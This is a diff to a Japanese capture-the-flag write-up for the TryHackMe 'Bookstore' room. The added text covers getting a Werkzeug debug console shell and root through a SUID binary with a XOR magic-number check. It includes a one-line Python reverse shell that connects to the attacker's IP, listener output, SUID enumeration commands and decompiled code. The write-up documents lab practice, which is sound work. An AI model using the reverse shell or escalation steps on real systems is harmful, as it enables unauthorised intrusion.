@@ -350,33 +350,88 @@ https://werkzeug.palletsprojects.com/en/stable/debug/
 
 → /console で Bad Request にならず、PIN を聞かれるのが期待動作と判明。ルームバグとして報告済み。対応待ちのため一時中断する。
 
+→ 数か月経過し、結局サポートは何も対応してくれなかったが動作するようになっていると聞いたので再開。
+
+コンソールでPINコードを入力し、Pythonリバースシェルを実行
+
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.85.243",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+```
+
+```sh
+$ nc -lnvp 8888                       
+listening on [any] 8888 ...
+connect to [10.13.85.243] from (UNKNOWN) [10.10.97.170] 33090
+$ id
+id
+uid=1000(sid) gid=1000(sid) groups=1000(sid)
+```
+
 ## 権限昇格
+
+/home/sid/try-harder というSUIDプログラムがある。
+
+```sh
+sid@bookstore:~$ find / -perm -u=s -type f -ls 2>/dev/null
+find / -perm -u=s -type f -ls 2>/dev/null
+   407939     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
+   393321     28 -rwsr-xr-x   1 root     root        26696 Mar  5  2020 /bin/umount
+   393277     44 -rwsr-xr-x   1 root     root        43088 Mar  5  2020 /bin/mount
+   393304     44 -rwsr-xr-x   1 root     root        44664 Mar 23  2019 /bin/su
+   393286     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
+   394562     12 -rwsrwsr-x   1 root     sid          8488 Oct 20  2020 /home/sid/try-harder
+```
+
+ghidra
+
+```c
+void main(void)
+{
+  long in_FS_OFFSET;
+  uint local_1c;
+  uint local_18;
+  uint local_14;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  setuid(0);
+  local_18 = 0x5db3;
+  puts("What\'s The Magic Number?!");
+  __isoc99_scanf(&DAT_001008ee,&local_1c);
+  local_14 = local_1c ^ 0x1116 ^ local_18;
+  if (local_14 == 0x5dcd21f4) {
+    system("/bin/bash -p");
+  }
+  else {
+    puts("Incorrect Try Harder");
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+```
+
+整数dを入力し、下記が成り立てばクリア。
+
+```
+d XOR 0x1116 XOR 0x5db3 == 0x5dcd21f4
+```
+
+dを計算して入力するだけでrootシェルを取得できた。
+
+```sh
+sid@bookstore:~$ ./try-harder
+What's The Magic Number?!
+[REDACTED]
+root@bookstore:~# id
+id
+uid=0(root) gid=1000(sid) groups=1000(sid)
+```
+
 
 ## 振り返り
 
-- /console で Bad Request が返る
--
-
-## シェル安定化メモ
-
-```shell
-# python が無くても、python3 でいける場合もある
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-
-```
-
-WERKZEUG_DEBUG_PIN=123-321-135
+- バグとTHMサポートのコミュニケーション能力欠如の印象しかない。
+- WERKZEUG、Debugコンソール、PIN code というキーワードだけ覚えておく。
